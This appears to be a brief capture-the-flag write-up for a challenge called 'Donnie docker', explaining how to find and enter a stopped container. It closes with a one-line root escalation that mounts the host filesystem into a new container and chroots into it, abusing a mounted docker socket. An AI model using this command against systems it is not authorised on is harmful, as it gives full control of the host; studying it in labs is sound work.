## Donnie docker

you just run docker ```ps -a``` to see the stopped container. Then docker start it, ```docker exec -it [containername] /bin/bash``` to get into it

ps: you could get root on the docker host because the docker socket is mounted ```docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash```
